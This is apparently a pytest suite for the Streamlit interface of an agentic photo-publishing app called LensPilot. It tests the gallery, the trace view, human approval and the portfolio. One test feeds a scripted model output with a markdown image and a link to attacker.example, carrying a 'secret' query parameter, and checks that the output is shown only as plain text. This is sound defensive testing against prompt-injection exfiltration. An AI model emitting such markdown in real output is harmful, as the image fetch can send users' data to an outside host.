"""Streamlit UI integration (requirements 18-22). Runs the real views in-process with AppTest."""

from __future__ import annotations

from pathlib import Path

import pytest
import streamlit as st
from streamlit.testing.v1 import AppTest

from agent.integration import build_agent, build_services, make_provider

ROOT = Path(__file__).resolve().parent.parent


@pytest.fixture
def data_dir(tmp_path, monkeypatch):
    d = tmp_path / "data"
    monkeypatch.setenv("LENSPILOT_DATA_DIR", str(d))
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    st.cache_resource.clear()
    st.cache_data.clear()
    yield d
    st.cache_resource.clear()


def _all_markdown(at: AppTest) -> str:
    return "\n".join(m.value for m in at.markdown)


def _view(name: str, *args) -> AppTest:
    def script(name, args):
        import importlib
        from ui.common import apply_theme
        apply_theme()
        importlib.import_module(f"ui.{name}").render(*args)
    return AppTest.from_function(script, args=(name, args), default_timeout=30)


def test_app_loads(data_dir):  # 18
    at = AppTest.from_file(str(ROOT / "app.py"), default_timeout=30).run()
    assert not at.exception
    assert any(t.value == "LensPilot" for t in at.title)


def test_gallery_reads_sandbox_catalog(data_dir):  # 19
    at = _view("gallery").run()
    assert not at.exception
    titles = build_services(data_dir).sandbox.catalog()
    md = _all_markdown(at)
    assert all(p["title"].replace("'", "&#x27;") in md for p in titles)
    assert md.count('class="lp-title"') == len(titles) == 10


def _waiting_run(data_dir):
    sv = build_services(data_dir)
    agent = build_agent(sv, make_provider("mock-heuristic"))
    state = agent.run(agent.start("best two interior photographs").run_id)
    assert state.status.value == "WAITING_FOR_APPROVAL"
    return sv, agent, state


def test_trace_view_shows_recorded_events(data_dir):  # 20
    _, _, state = _waiting_run(data_dir)
    at = _view("execution")
    at.session_state["active_run_id"] = state.run_id
    at.run()
    assert not at.exception
    md = _all_markdown(at)
    for rec in state.tool_history:
        assert f"Step {rec.step}: {rec.tool}" in md
    assert "Waiting for human approval" in md


def test_model_output_is_never_rendered_as_markdown(data_dir):
    """Injected text steering the model must not become a live link/image in the UI."""
    from agent.mock_providers import ScriptedProvider, text
    sv = build_services(data_dir)
    payload = "Done ![x](https://attacker.example/leak?d=secret) [click](https://attacker.example)"
    agent = build_agent(sv, ScriptedProvider([[text(payload)]]))
    state = agent.run(agent.start("x").run_id)
    for view, args in [("execution", ()), ("workspace", ("mock-heuristic", False))]:
        at = _view(view, *args)
        at.session_state["active_run_id"] = state.run_id
        at.run()
        assert not at.exception
        assert "](https://attacker.example" not in _all_markdown(at)  # not in any markdown element
        assert any(payload in t.value for t in at.text)  # shown verbatim as plain text instead


def test_portfolio_reflects_real_writes(data_dir):  # 21
    at = _view("portfolio").run()
    assert any("Nothing is published yet" in i.value for i in at.info)
    sv, agent, state = _waiting_run(data_dir)
    agent.approve(state.run_id, state.pending_approval.proposal_hash)
    at = _view("portfolio").run()
    md = _all_markdown(at)
    assert "Loft living room" in md and "Hotel lobby" in md
    assert md.count('class="lp-title"') == len(sv.sandbox.published_records()) == 2


def test_reruns_and_double_clicks_do_not_duplicate(data_dir):  # 22
    sv, _, state = _waiting_run(data_dir)
    at = _view("workspace", "mock-heuristic", False)
    at.session_state["active_run_id"] = state.run_id
    at.run()
    h = state.pending_approval.proposal_hash
    at.button(key=f"approve_{h}").click().run()
    assert not at.exception
    for _ in range(3):
        at.run()  # plain reruns
    assert len(sv.sandbox.published_records()) == 2
    final = sv.store.load(state.run_id)
    assert final.status.value == "COMPLETED"
    assert sum(r.tool == "publish_photo" for r in final.tool_history) == 1
    assert not [b for b in at.button if b.key == f"approve_{h}"]  # control gone after decision
